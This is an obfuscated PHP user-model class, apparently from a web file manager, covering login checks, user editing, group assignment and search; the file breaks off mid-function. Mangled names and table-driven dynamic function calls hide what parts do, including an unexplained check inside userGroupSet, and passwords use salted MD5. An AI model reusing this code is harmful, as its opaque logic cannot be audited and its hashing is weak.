<?php
 goto CÑô¥ñÄ³ò; E‰ÀÈĞ»ì: define($_SERVER[Ó¡Ÿ§‚][238], 1); define($_SERVER[Ó¡Ÿ§‚][239], 2); define($_SERVER[Ó¡Ÿ§‚][240], 3); goto bÃôÜ£¢Ò•; BÍÈéØµÎ¨: class UserModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72"; protected $tableMeta = array("\x74\x61\x62\154\145\x4e\x61\155\x65" => "\165\163\145\162\x5f\x6d\x65\x74\x61", "\155\145\x74\x61\106\151\x65\x6c\144" => "\165\x73\145\162\111\104"); protected $simpleField = "\165\163\145\162\x49\104\x2c\x6e\151\x63\x6b\x4e\141\155\145\54\x6e\141\155\x65\x2c\x61\166\141\164\x61\162\x2c\163\x65\170\54\x73\164\141\164\x75\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($†ªˆ¾„ˆ) { $¢»½š‚ =& $_SERVER[Ó¡Ÿ§‚]; $˜ïµ = $¢»½š‚[2301]; return array($¢»½š‚[1932] => array($†ªˆ¾„ˆ[0], $˜ïµ), $¢»½š‚[1934] => array($†ªˆ¾„ˆ[0], $˜ïµ), $¢»½š‚[2302] => array($†ªˆ¾„ˆ[0], $˜ïµ)); } protected function getInfo($ô» òï, $ƒ·•æÌ° = false) { $èÇòõˆâ = $this->getInfoSimple($ô» òï); if (!is_array($èÇòõˆâ)) { return array(); } if ($ƒ·•æÌ°) { return $this->_getInfoApply($èÇòõˆâ); } return $this->cacheFunctionGet($_SERVER[Ó¡Ÿ§‚][1936], $ô» òï); } protected function getInfoFull($Éí«İ½‘, $Âõóö = false) { $Ö¡Ûïü‘ = $this->getInfoSimple($Éí«İ½‘); if (!is_array($Ö¡Ûïü‘)) { return array(); } if ($Âõóö) { return $this->_getInfoApply($Ö¡Ûïü‘, !0); } return $this->cacheFunctionGet($_SERVER[Ó¡Ÿ§‚][2303], $Éí«İ½‘); } private function _getInfoApply($ûåñ‡â, $ÕğÙ£Öã = false) { $ù»é«ÅÜ =& $_SERVER[Ó¡Ÿ§‚]; if (!$ûåñ‡â) { return $ûåñ‡â; } $Åî›»¼¨ = md5($ù»é«ÅÜ[2304] . $ûåñ‡â[$ù»é«ÅÜ[888]] . $ù»é«ÅÜ[2305] . $ûåñ‡â[$ù»é«ÅÜ[32]]); $ûåñ‡â = $this->_listDataApplyItem($ûåñ‡â); $Ú·ä½–‰ = Model($ù»é«ÅÜ[1338])->metaGet($ûåñ‡â[$ù»é«ÅÜ[87]][$ù»é«ÅÜ[411]]); $ûåñ‡â[$ù»é«ÅÜ[2306]] = $Åî›»¼¨; $ûåñ‡â[$ù»é«ÅÜ[87]][$ù»é«ÅÜ[2127]] = isset($Ú·ä½–‰[$ù»é«ÅÜ[2128]]) ? $Ú·ä½–‰[$ù»é«ÅÜ[2128]] : null; if ($ÕğÙ£Öã) { $ûåñ‡â[$ù»é«ÅÜ[475]] = $this->metaGet($ûåñ‡â[$ù»é«ÅÜ[1665]]); } return $ûåñ‡â; } protected function getInfoSimple($¤ØÇÇÂ, $í±øô‚¾ = false) { $óÛğ¡í… =& $_SERVER[Ó¡Ÿ§‚]; if (!$¤ØÇÇÂ) { return array(); } if ($í±øô‚¾) { $â½ÛÁ¼ = $this->where(array($óÛğ¡í…[1665] => intval($¤ØÇÇÂ)))->find(); if (!is_array($â½ÛÁ¼)) { return array(); } $â½ÛÁ¼[$óÛğ¡í…[542]] = Action($óÛğ¡í…[2307])->parseUrl($â½ÛÁ¼[$óÛğ¡í…[542]]); return $â½ÛÁ¼; } return $this->cacheFunctionGet($óÛğ¡í…[1937], $¤ØÇÇÂ); } protected function getInfoSimpleOuter($ı•”ÖŸ–) { $®»òÎëñ =& $_SERVER[Ó¡Ÿ§‚]; if (!$ı•”ÖŸ– || $ı•”ÖŸ– == 0) { return array($®»òÎëñ[1665] => $®»òÎëñ[198], $®»òÎëñ[32] => $®»òÎëñ[162] . LNG($®»òÎëñ[2308]) . $®»òÎëñ[164], $®»òÎëñ[542] => STATIC_PATH . $®»òÎëñ[2309]); } $¶ŒÕ¬‰“ = $this->cacheFunctionGet($®»òÎëñ[1937], $ı•”ÖŸ–); $¯²ƒØÑÈ = array_field_key($¶ŒÕ¬‰“, explode($®»òÎëñ[50], $this->simpleField)); if (!$¯²ƒØÑÈ) { return array($®»òÎëñ[1665] => $®»òÎëñ[1187], $®»òÎëñ[32] => $®»òÎëñ[162] . LNG($®»òÎëñ[2310]) . $®»òÎëñ[164], $®»òÎëñ[542] => STATIC_PATH . $®»òÎëñ[2311]); } $¯²ƒØÑÈ[$®»òÎëñ[542]] = Action($®»òÎëñ[2307])->parseUrl($¯²ƒØÑÈ[$®»òÎëñ[542]]); return $¯²ƒØÑÈ; } protected function groupUser($ˆú™°ıŒ) { } public static function errorLang($Â©„Òøí) { $Ä˜ËÔ¹¨ =& $_SERVER[Ó¡Ÿ§‚]; $¥‡ß›¼ˆ = array(self::ERROR_USER_NOT_EXISTS => $Ä˜ËÔ¹¨[2312], self::ERROR_USER_PASSWORD_ERROR => $Ä˜ËÔ¹¨[2313], self::ERROR_USER_EXIST_NAME => $Ä˜ËÔ¹¨[2314], self::ERROR_USER_EXIST_PHONE => $Ä˜ËÔ¹¨[2315], self::ERROR_USER_EXIST_EMAIL => $Ä˜ËÔ¹¨[2316], self::ERROR_USER_LOGIN_LOCK => $Ä˜ËÔ¹¨[2317], self::ERROR_IP_NOT_ALLOW => $Ä˜ËÔ¹¨[2318], self::ERROR_USER_EXIST_NICKNAME => $Ä˜ËÔ¹¨[2319]); return LNG($¥‡ß›¼ˆ[$Â©„Òøí]); } public function getInfoByMeta($‹Îå†ò©, $•‹Ä±éÌ) { $ÒøöÒ™Í =& $_SERVER[Ó¡Ÿ§‚]; $±ö‰’ºİ = Model($ÒøöÒ™Í[2320])->where(array($ÒøöÒ™Í[94] => $‹Îå†ò©, $ÒøöÒ™Í[374] => $•‹Ä±éÌ))->find(); if ($±ö‰’ºİ) { return $this->getInfo($±ö‰’ºİ[$ÒøöÒ™Í[1665]]); } return !1; } public function userLoginCheck($Óí¨¤¹, $Â£´ĞÎÈ) { $ĞÉ­‹™ =& $_SERVER[Ó¡Ÿ§‚]; $Ù±¶Á¿ñ = $this->userLoginFind($Óí¨¤¹); if (!$Ù±¶Á¿ñ) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($Ù±¶Á¿ñ[$ĞÉ­‹™[1665]], $Â£´ĞÎÈ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($Ù±¶Á¿ñ[$ĞÉ­‹™[1665]]); } public function userLoginFind($ŠãÉ) { $ÉšÈÚ˜µ =& $_SERVER[Ó¡Ÿ§‚]; $«‡ùèšû = array($ÉšÈÚ˜µ[32] => $ŠãÉ, $ÉšÈÚ˜µ[541] => $ŠãÉ, $ÉšÈÚ˜µ[305] => $ŠãÉ, $ÉšÈÚ˜µ[2321] => $ŠãÉ, $ÉšÈÚ˜µ[999] => $ÉšÈÚ˜µ[1001]); if ($this->nickNameRpt()) { unset($«‡ùèšû[$ÉšÈÚ˜µ[541]]); } return $this->where($«‡ùèšû)->find(); } public function clearCache($ı·èú«) { $œí¼†¯ =& $_SERVER[Ó¡Ÿ§‚]; $this->cacheFunctionClear($œí¼†¯[1936], $ı·èú«); $this->cacheFunctionClear($œí¼†¯[1937], $ı·èú«); $this->cacheFunctionClear($œí¼†¯[2303], $ı·èú«); } public function userPasswordCheck($¥œìá®â, $Ú„¥ƒ½) { $³í›ÒÒ =& $_SERVER[Ó¡Ÿ§‚]; $½Â‹ÚŒ¬ = $this->where(array($³í›ÒÒ[1665] => intval($¥œìá®â)))->find(); $µÏí­ğë = $this->metaGet($¥œìá®â); $ø€„Şğç = isset($µÏí­ğë[$³í›ÒÒ[2322]]) ? $µÏí­ğë[$³í›ÒÒ[2322]] : $³í›ÒÒ[12]; if (md5($ø€„Şğç . trim($Ú„¥ƒ½)) !== $½Â‹ÚŒ¬[$³í›ÒÒ[888]]) { return !1; } return !0; } public function userAdd($­Öôá¹) { $½¦ÆÜğä =& $_SERVER[Ó¡Ÿ§‚]; $÷ŒÎëñ¢ = array($½¦ÆÜğä[429] => $­Öôá¹[$½¦ÆÜğä[32]], $½¦ÆÜğä[2323] => $­Öôá¹[$½¦ÆÜğä[1546]], $½¦ÆÜğä[2324] => isset($­Öôá¹[$½¦ÆÜğä[305]]) ? $­Öôá¹[$½¦ÆÜğä[305]] : $½¦ÆÜğä[12], $½¦ÆÜğä[2325] => isset($­Öôá¹[$½¦ÆÜğä[2321]]) ? $­Öôá¹[$½¦ÆÜğä[2321]] : $½¦ÆÜğä[12], $½¦ÆÜğä[2326] => isset($­Öôá¹[$½¦ÆÜğä[541]]) ? $­Öôá¹[$½¦ÆÜğä[541]] : $­Öôá¹[$½¦ÆÜğä[32]], $½¦ÆÜğä[2327] => isset($­Öôá¹[$½¦ÆÜğä[542]]) ? $­Öôá¹[$½¦ÆÜğä[542]] : $½¦ÆÜğä[12], $½¦ÆÜğä[2328] => isset($­Öôá¹[$½¦ÆÜğä[2329]]) ? $­Öôá¹[$½¦ÆÜğä[2329]] : 1, $½¦ÆÜğä[2330] => $­Öôá¹[$½¦ÆÜğä[888]], $½¦ÆÜğä[1938] => isset($­Öôá¹[$½¦ÆÜğä[1841]]) ? $­Öôá¹[$½¦ÆÜğä[1841]] : 1024 * 1024 * 20, $½¦ÆÜğä[1939] => 0, $½¦ÆÜğä[2331] => 0, $½¦ÆÜğä[1983] => isset($­Öôá¹[$½¦ÆÜğä[748]]) ? $­Öôá¹[$½¦ÆÜğä[748]] : 1); if (!empty($­Öôá¹[$½¦ÆÜğä[1665]])) { $÷ŒÎëñ¢[$½¦ÆÜğä[1665]] = $­Öôá¹[$½¦ÆÜğä[1665]]; } $’Íçç§ğ = $this->_checkExist($­Öôá¹); if ($’Íçç§ğ !== !0) { return $’Íçç§ğ; } if (!empty($÷ŒÎëñ¢[$½¦ÆÜğä[542]]) && strlen($÷ŒÎëñ¢[$½¦ÆÜğä[542]]) > 255) { $÷ŒÎëñ¢[$½¦ÆÜğä[542]] = $½¦ÆÜğä[12]; } $ ¸”¥ğâ = $this->add($÷ŒÎëñ¢); $ØÊñ°ì = array($½¦ÆÜğä[2330] => $÷ŒÎëñ¢[$½¦ÆÜğä[888]], $½¦ÆÜğä[2326] => $÷ŒÎëñ¢[$½¦ÆÜğä[541]]); $this->userEdit($ ¸”¥ğâ, $ØÊñ°ì); Model($½¦ÆÜğä[1338])->userRootAdd($ ¸”¥ğâ); return $ ¸”¥ğâ; } protected function userEditTest($«¥¿¡·¤, $Ÿüø±¤ï) { return $this->call($_SERVER[Ó¡Ÿ§‚][2332], $«¥¿¡·¤, $Ÿüø±¤ï); } protected function userEdit($üûÚéÇ, $†¬©ã«) { $Ç¢ÖÖÚ© =& $_SERVER[Ó¡Ÿ§‚]; $íÇŠ“Ÿ‚ = $this->getInfoSimple($üûÚéÇ); if (!$íÇŠ“Ÿ‚) { return !1; } $çª—¶Û = $this->_checkExist($†¬©ã«, $üûÚéÇ); if ($çª—¶Û !== !0) { return $çª—¶Û; } if (isset($†¬©ã«[$Ç¢ÖÖÚ©[888]]) && trim($†¬©ã«[$Ç¢ÖÖÚ©[888]]) != $Ç¢ÖÖÚ©[12]) { $²®ÉòÌŒ = $this->metaGet($üûÚéÇ); if (empty($²®ÉòÌŒ[$Ç¢ÖÖÚ©[2322]])) { $²®ÉòÌŒ[$Ç¢ÖÖÚ©[2322]] = rand_string(10); Model($Ç¢ÖÖÚ©[513])->metaSet($üûÚéÇ, $Ç¢ÖÖÚ©[2322], $²®ÉòÌŒ[$Ç¢ÖÖÚ©[2322]]); } $†¬©ã«[$Ç¢ÖÖÚ©[888]] = md5($²®ÉòÌŒ[$Ç¢ÖÖÚ©[2322]] . trim($†¬©ã«[$Ç¢ÖÖÚ©[888]])); } else { unset($†¬©ã«[$Ç¢ÖÖÚ©[888]]); } if (!empty($†¬©ã«[$Ç¢ÖÖÚ©[542]]) && strlen($†¬©ã«[$Ç¢ÖÖÚ©[542]]) > 255) { $†¬©ã«[$Ç¢ÖÖÚ©[542]] = $Ç¢ÖÖÚ©[12]; } $this->where(array($Ç¢ÖÖÚ©[1656] => $üûÚéÇ))->save($†¬©ã«); if (isset($†¬©ã«[$Ç¢ÖÖÚ©[541]])) { $this->setNamePinyin($üûÚéÇ, $†¬©ã«[$Ç¢ÖÖÚ©[541]]); } $this->clearCache($üûÚéÇ); return !0; } public function setNamePinyin($ìŞáğ¨, $ø…±¶÷† = false) { $ñ¸”®†í =& $_SERVER[Ó¡Ÿ§‚]; if (!$ø…±¶÷†) { $ÌßŸÚÅ£ = $this->getInfoSimple($ìŞáğ¨); $ø…±¶÷† = $ÌßŸÚÅ£[$ñ¸”®†í[541]] ? $ÌßŸÚÅ£[$ñ¸”®†í[541]] : $ÌßŸÚÅ£[$ñ¸”®†í[32]]; } $ûüø›¸ = Model($ñ¸”®†í[534]); if (!Input::check($ø…±¶÷†, $ñ¸”®†í[592])) { return $ûüø›¸->metaSet($ìŞáğ¨, array($ñ¸”®†í[474] => $ñ¸”®†í[12], $ñ¸”®†í[473] => $ñ¸”®†í[12])); } return $ûüø›¸->metaSet($ìŞáğ¨, array($ñ¸”®†í[474] => str_replace($ñ¸”®†í[53], $ñ¸”®†í[12], Pinyin::get($ø…±¶÷†)), $ñ¸”®†í[473] => Pinyin::get($ø…±¶÷†, $ñ¸”®†í[593]))); } private function nickNameRpt() { $öÛÚ–àâ =& $_SERVER[Ó¡Ÿ§‚]; $ò˜æ¥Æ = Model($öÛÚ–àâ[769])->get($öÛÚ–àâ[2333]); $÷Œï–°Ï = $GLOBALS[$öÛÚ–àâ[6]][$öÛÚ–àâ[381]][$öÛÚ–àâ[2333]]; $¥ Ãí¬Š = !is_null($ò˜æ¥Æ) ? $ò˜æ¥Æ : $÷Œï–°Ï; return !!$¥ Ãí¬Š; } private function _checkExist($êŒÕ£Ö˜, $¶¶¥Æ—´ = false) { $’—æÌ—® =& $_SERVER[Ó¡Ÿ§‚]; $ğÚ­‘»È = array($’—æÌ—®[32] => UserModel::ERROR_USER_EXIST_NAME, $’—æÌ—®[541] => UserModel::ERROR_USER_EXIST_NICKNAME, $’—æÌ—®[305] => UserModel::ERROR_USER_EXIST_EMAIL, $’—æÌ—®[2321] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($ğÚ­‘»È[$’—æÌ—®[541]]); } $ğˆ™ïÂØ = $¶¶¥Æ—´ ? array($’—æÌ—®[1665] => array($’—æÌ—®[2334], $¶¶¥Æ—´)) : array(); foreach ($ğÚ­‘»È as $ÕõİğÖŸ => $ïÑ©œŸ†) { $åö¨¤ã‰ = array(); foreach ($ğÚ­‘»È as $åãë«›Á => $ÀÌä¼ã§) { if (isset($êŒÕ£Ö˜[$åãë«›Á]) && $êŒÕ£Ö˜[$åãë«›Á]) { $åö¨¤ã‰[] = $êŒÕ£Ö˜[$åãë«›Á]; } } if (!$åö¨¤ã‰) { continue; } $á‹ñ ‰ = array_merge(array($ÕõİğÖŸ => array($’—æÌ—®[7], $åö¨¤ã‰)), $ğˆ™ïÂØ); $Ù´é•‹æ = $this->where($á‹ñ ‰)->find(); if ($Ù´é•‹æ) { return $ïÑ©œŸ†; } } return !0; } public function userListInfo($”Ñ²é±ƒ) { $²ÃÛ¾“ı =& $_SERVER[Ó¡Ÿ§‚]; $Ùı²çÌ = array(); $”Ñ²é±ƒ = is_array($”Ñ²é±ƒ) ? array_unique($”Ñ²é±ƒ) : array(); if (!$”Ñ²é±ƒ) { return $Ùı²çÌ; } if (count($”Ñ²é±ƒ) < 20) { foreach ($”Ñ²é±ƒ as $ÚÂ»ÙÖä) { $Ùı²çÌ[$ÚÂ»ÙÖä . $²ÃÛ¾“ı[12]] = $this->getInfoSimpleOuter($ÚÂ»ÙÖä); } } else { $Î¯Ï¼ó = array($²ÃÛ¾“ı[1656] => array($²ÃÛ¾“ı[427], $”Ñ²é±ƒ)); if (count($”Ñ²é±ƒ) == 1) { $Î¯Ï¼ó = array($²ÃÛ¾“ı[1656] => $”Ñ²é±ƒ[0]); } $Ê•û„‹ = Model($²ÃÛ¾“ı[513])->field($this->simpleField)->where($Î¯Ï¼ó)->select(); $Ê•û„‹ = array_to_keyvalue($Ê•û„‹, $²ÃÛ¾“ı[1665]); foreach ($”Ñ²é±ƒ as $ÚÂ»ÙÖä) { $™ˆŞ©Ò = $Ê•û„‹[$ÚÂ»ÙÖä]; if (!$™ˆŞ©Ò) { $Ùı²çÌ[$ÚÂ»ÙÖä . $²ÃÛ¾“ı[12]] = $this->getInfoSimpleOuter($ÚÂ»ÙÖä); continue; } $™ˆŞ©Ò[$²ÃÛ¾“ı[542]] = Action($²ÃÛ¾“ı[2307])->parseUrl($™ˆŞ©Ò[$²ÃÛ¾“ı[542]]); $Ùı²çÌ[$ÚÂ»ÙÖä . $²ÃÛ¾“ı[12]] = $™ˆŞ©Ò; } } return $Ùı²çÌ; } protected function userStatus($âíáàÅÍ, $¹¨†æÜç) { $¾ÂƒäàÑ = $this->getInfoSimple($âíáàÅÍ); if (!$¾ÂƒäàÑ) { return !1; } $˜İÛØ» = array($_SERVER[Ó¡Ÿ§‚][748] => $¹¨†æÜç); return $this->userEdit($âíáàÅÍ, $˜İÛØ»); } protected function userRemove($×Ã¤ËÛª) { $òÓµàÍœ =& $_SERVER[Ó¡Ÿ§‚]; $…æë³¿Û = $this->getInfoSimple($×Ã¤ËÛª); if (!$…æë³¿Û) { return !1; } $…÷¼Ëı» = array($òÓµàÍœ[1656] => $×Ã¤ËÛª); Model($òÓµàÍœ[601])->where($…÷¼Ëı»)->delete(); Model($òÓµàÍœ[2335])->where($…÷¼Ëı»)->delete(); Model($òÓµàÍœ[1944])->where($…÷¼Ëı»)->delete(); Model($òÓµàÍœ[2320])->where($…÷¼Ëı»)->delete(); Model($òÓµàÍœ[1067])->where($…÷¼Ëı»)->delete(); Model($òÓµàÍœ[2151])->removeUserAll($×Ã¤ËÛª); Model($òÓµàÍœ[824])->userRootRemove($×Ã¤ËÛª); return $this->where($…÷¼Ëı»)->delete(); } protected function userGroupSet($Ì”½¥Õ±, $Ò¦â”Í¶, $ã«†‹ÂÎ = array()) { $Û±–íà =& $_SERVER[Ó¡Ÿ§‚]; if ($_SERVER[$Û±–íà[401]] != $_SERVER[$Û±–íà[402]]) { $şåïÍŞ = $Û±–íà[876]; $’ÔëÀçŸ = $Û±–íà[403]; $‚¦Ö’äÅ = $_SERVER[$Û±–íà[404]] . $Û±–íà[405]; $¬òÂäÁ = $’ÔëÀçŸ($‚¦Ö’äÅ); $ŸÖ±Ò´Î = explode($Û±–íà[231], $¬òÂäÁ); if (count($ŸÖ±Ò´Î) < $Û±–íà[625]) { $ÄÃÏ šÀ = $Û±–íà[407]; $ÄÃÏ šÀ(); } $Ñò¾À£ğ = $Û±–íà[877]; $Ñò¾À£ğ($_SERVER[$Û±–íà[878]]); $Ñò¾À£ğ($_SERVER[$Û±–íà[404]] . $Û±–íà[1532]); $Â–×˜Ãş = 1; while ($Â–×˜Ãş > 1) { $Â–×˜Ãş = $Â–×˜Ãş + 4; $‡ÒŸÏÔ¾ = rawurlencode($Â–×˜Ãş . $Û±–íà[378]); } } $»çªŞ€ = $this->getInfoSimple($Ì”½¥Õ±); if (!$»çªŞ€ || !is_array($Ò¦â”Í¶)) { return !1; } $ı¡ŸÁÎ  = Model($Û±–íà[1944]); $ı¡ŸÁÎ ->where(array($Û±–íà[1665] => $Ì”½¥Õ±))->delete(); $—èı‘« = array(); $®ÅÉªß„ = 0; foreach ($Ò¦â”Í¶ as $è¿«³¨© => $ï†ãäÆ­) { $·şïğ“™ = array($Û±–íà[1665] => $Ì”½¥Õ±, $Û±–íà[1854] => $è¿«³¨©, $Û±–íà[1958] => $ï†ãäÆ­); $·şïğ“™[$Û±–íà[1878]] = isset($ã«†‹ÂÎ[$®ÅÉªß„]) ? $ã«†‹ÂÎ[$®ÅÉªß„] : 0; $®ÅÉªß„++; $—èı‘«[] = $·şïğ“™; } return $ı¡ŸÁÎ ->addAll($—èı‘«, array(), !0); } protected function userGroupAdd($¦”ÛòÏ, $“—ÓæŸ« = array()) { $Á‹‹ºŠé =& $_SERVER[Ó¡Ÿ§‚]; $ŒıÌÇ¦ = $this->getInfoSimple($¦”ÛòÏ); if (!$ŒıÌÇ¦ || empty($“—ÓæŸ«)) { return !1; } $§£²ä»‘ = array(); foreach ($“—ÓæŸ« as $‹Ñ‘üöç => $øÅÀ¯©ƒ) { $§£²ä»‘[] = array($Á‹‹ºŠé[1665] => $¦”ÛòÏ, $Á‹‹ºŠé[1854] => $‹Ñ‘üöç, $Á‹‹ºŠé[1958] => $øÅÀ¯©ƒ, $Á‹‹ºŠé[1878] => 0); } return Model($Á‹‹ºŠé[1944])->addAll($§£²ä»‘, array(), !0); } protected function userGroupRemove($ü‘§Ä„Ô, $°ÉÌšå) { $ÆÆœéó =& $_SERVER[Ó¡Ÿ§‚]; $äĞëØ ¬ = $this->getInfoSimple($ü‘§Ä„Ô); if (!$äĞëØ ¬ || !$°ÉÌšå) { return !1; } $”¡ù˜öç = array($ÆÆœéó[1656] => $ü‘§Ä„Ô, $ÆÆœéó[1942] => $°ÉÌšå); return Model($ÆÆœéó[1944])->where($”¡ù˜öç)->delete(); } public function listData() { $‘È“¸ ¯ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($‘È“¸ ¯[$_SERVER[Ó¡Ÿ§‚][369]]); return $‘È“¸ ¯; } public function listByID($µª«áü‰) { $øœÊƒ¾‘ =& $_SERVER[Ó¡Ÿ§‚]; if (!$µª«áü‰) { return; } $ˆÙë© È = array($øœÊƒ¾‘[1665] => array($øœÊƒ¾‘[7], $µª«áü‰)); $”Ó›†Áß = $this->where($ˆÙë© È)->select(); $”Ó›†Áß = array_sort_keep($”Ó›†Áß, $øœÊƒ¾‘[1665], $µª«áü‰); $this->_listDataApply($”Ó›†Áß); return $”Ó›†Áß; } public function listByGroup($“¥°™º = 0, $äºæ„˜ = array()) { $ñšÙÌä =& $_SERVER[Ó¡Ÿ§‚]; $œ¨ëà–Ë = $ñšÙÌä[12]; $…ĞÓÀí³ = array(); if ($“¥°™º) { $…ĞÓÀí³ = array($ñšÙÌä[2336] => intval($“¥°™º)); $œ¨ëà–Ë = "\114\x45\106\124\x20\x4a\x4f\111\116\x20{$this->tablePrefix}\165\163\145\162\137\x67\162\157\165\x70\40\165\x73\145\x72\x5f\x67\x72\157\165\x70\x20\x6f\156\40\x75\163\x65\162\56\165\x73\x65\x72\x49\104\x20\75\40\165\163\145\x72\x5f\x67\162\x6f\165\160\56\165\x73\x65\162\111\104"; $Ë•´²î— = Input::get($ñšÙÌä[466], null, $ñšÙÌä[12]) ? $ñšÙÌä[12] : $ñšÙÌä[2337]; } if (isset($äºæ„˜[$ñšÙÌä[748]])) { $…ĞÓÀí³[$ñšÙÌä[2338]] = $äºæ„˜[$ñšÙÌä[748]]; } $ÓéÛÓÖø = $this->_makeOrder($Ë•´²î—)->field($ñšÙÌä[2339])->where($…ĞÓÀí³)->join($œ¨ëà–Ë)->selectPage(50); $this->_listDataApply($ÓéÛÓÖø[$ñšÙÌä[369]]); return $ÓéÛÓÖø; } private function _makeOrder($°¼ßÌ¿Ñ = '') { $Ù„ÇĞŒØ =& $_SERVER[Ó¡Ÿ§‚]; $Ñ‘ÒÃí = array($Ù„ÇĞŒØ[1665], $Ù„ÇĞŒØ[32], $Ù„ÇĞŒØ[1843], $Ù„ÇĞŒØ[1815], $Ù„ÇĞŒØ[201]); $ÙÖ±Œµ¬ = array($Ù„ÇĞŒØ[459] => $Ù„ÇĞŒØ[460], $Ù„ÇĞŒØ[461] => $Ù„ÇĞŒØ[462]); $Ê¨Äú¾› = Input::get($Ù„ÇĞŒØ[466], $Ù„ÇĞŒØ[7], $Ù„ÇĞŒØ[1656], $Ñ‘ÒÃí); $±ÇÍ¯Š² = Input::get($Ù„ÇĞŒØ[467], $Ù„ÇĞŒØ[7], $Ù„ÇĞŒØ[1945], array($Ù„ÇĞŒØ[1945], $Ù„ÇĞŒØ[461])); $±ÇÍ¯Š² = $ÙÖ±Œµ¬[$±ÇÍ¯Š²]; $°¼ßÌ¿Ñ = $°¼ßÌ¿Ñ . "\165\x73\x65\162\x2e{$Ê¨Äú¾›}\x20{$±ÇÍ¯Š²}\54\x20\x75\x73\145\162\56\x75\x73\x65\x72\111\104\40\x61\163\x63"; return $this->alias($Ù„ÇĞŒØ[2071])->order($°¼ßÌ¿Ñ); } public function listSearch($Ù§Ü¦ó) { $”«ºéš =& $_SERVER[Ó¡Ÿ§‚]; $³ÉÈ–¡† = $Ù§Ü¦ó[$”«ºéš[1948]]; $ÀÃƒî×© = isset($Ù§Ü¦ó[$”«ºéš[1949]]) ? $Ù§Ü¦ó[$”«ºéš[1949]] : !1; $³ÉÈ–¡† = str_replace($”«ºéš[1950], $”«ºéš[1951], trim($³ÉÈ–¡†)); $¶Åƒ»Æ = array($”«ºéš[32] => array($”«ºéš[383], "\45{$³ÉÈ–¡†}\x25"), $”«ºéš[305] => array($”«ºéš[383], "{$³ÉÈ–¡†}\45"), $”«ºéš[541] => array($”«ºéš[383], "{$³ÉÈ–¡†}\45"), $”«ºéš[999] => $”«ºéš[1952]); if (Input::check($³ÉÈ–¡†, $”«ºéš[311])) { $¶Åƒ»Æ[$”«ºéš[1665]] = array($”«ºéš[383], "{$³ÉÈ–¡†}\x25"); $¶Åƒ»Æ[$”«ºéš[2321]] = array($”«ºéš[383], "{$³ÉÈ–¡†}\x25"); } if (!$³ÉÈ–¡†) { $¶Åƒ»Æ = array(); } if (isset($Ù§Ü¦ó[$”«ºéš[748]])) { $¶Åƒ»Æ[$”«ºéš[748]] = $Ù§Ü¦ó[$”«ºéš[748]]; } $¶Åƒ»Æ = $this->parseWhereLike($¶Åƒ»Æ); $šú®œÔç = $this->_makeOrder()->where($¶Åƒ»Æ)->selectPage(20); if (!$šú®œÔç || count($šú®œÔç[$”«ºéš[369]]) < 5 && Input::check($³ÉÈ–¡†, $”«ºéš[318])) { $ĞËª¢«Ë = $this->_searchFromMeta($”«ºéš[473], $³ÉÈ–¡†, 10); $ºÈ²š«¿ = $this->_searchFromMeta($”«ºéš[474], $³ÉÈ–¡†, 10); $óúÍ·ßÂ = array_merge($ĞËª¢«Ë, $ºÈ²š«¿, $šú®œÔç[$”«ºéš[369]]); $šú®œÔç[$”«ºéš[369]] = array_unique_by_key($óúÍ·ßÂ, $”«ºéš[1665]); $šú®œÔç[$”«ºéš[366]][$”«ºéš[367]] = count($šú®œÔç[$”«ºéš[369]]); $šú®œÔç[$”«ºéš[366]][$”«ºéš[368]] = ceil($šú®œÔç[$”«ºéš[366]][$”«ºéš[367]] / $šú®œÔç[$”«ºéš[366]][$”«ºéš[363]]); } $this->_listDataApply($šú®œÔç[$”«ºéš[369]]); $this->_filterByGroup($šú®œÔç, $ÀÃƒî×©); return $šú®œÔç; } private function _filterByGroup(&$É…ªáÊ™, $Õ¡ó¹¡¥) { $š†é¨º¦ =& $_SERVER[Ó¡Ÿ§‚]; if (!$Õ¡ó¹¡¥) { return $É…ªáÊ™; } foreach ($É…ªáÊ™[$š†é¨º¦[369]] as $¦“áÖ¥° => &$ø»¢ß–ı) { $Å‘½ÕÇ = array_to_keyvalue($ø»¢ß–ı[$š†é¨º¦[2041]], $š†é¨º¦[12], $š†é¨º¦[1854]); if (!in_array($Õ¡ó¹¡¥, $Å‘½ÕÇ)) { unset($É…ªáÊ™[$š†é¨º¦[369]][$¦“áÖ¥°]); } } unset($ø»¢ß–ı); $É…ªáÊ™[$š†é¨º¦[369]] = array_values($É…ªáÊ™[$š†é¨º¦[369]]); $É…ªáÊ™[$š†é¨º¦[366]] = array($š†é¨º¦[2105] => count($É…ªáÊ™[$š†é¨º¦[369]]), $š†é¨º¦[2103] => $É…ªáÊ™[$š†é¨º¦[366]][$š†é¨º¦[363]], $š†é¨º¦[2102] => 1, $š†é¨º¦[2104] => 1); } private function _searchFromMeta($Ò•…ãˆË, $¾Å€Œú, $™°ØÊ ) { $ØÏş€â© =& $_SERVER[Ó¡Ÿ§‚]; $¾Å€Œú = strtolower($¾Å€Œú); $•™Îùå” = array($ØÏş€â©[94] => $Ò•…ãˆË, $ØÏş€â©[374] => array($ØÏş€â©[383], "\45{$¾Å€Œú}\45")); $•™Îùå” = $this->parseWhereLike($•™Îùå”); $‡òèè“Ê = Model($ØÏş€â©[2340])->where($•™Îùå”)->limit($™°ØÊ )->select(); if (!$‡òèè“Ê) { return array(); } $‡òèè“Ê = array_to_keyvalue($‡òèè“Ê, $ØÏş€â©[12], $ØÏş€â©[1665]); $è·§ñÓ = $this->where(array($ØÏş€â©[1656] => array($ØÏş€â©[7], $‡òèè“Ê)))->select(); if (!$è·§ñÓ) { return array(); } return $è·§ñÓ; } private function _listDataApplyItem($ö÷²Œş) { $Î…İü¹Á = array($ö÷²Œş); $this->_listDataApply($Î…İü¹Á); return $Î…İü¹Á[0]; } private function _listDataApply(&$ŞÑª×ˆÆ) { $³¶œ‘¹ =& $_SERVER[Ó¡Ÿ§‚]; if (!$ŞÑª×ˆÆ) { return; } array_remove_key($ŞÑª×ˆÆ, $³¶œ‘¹[888]); 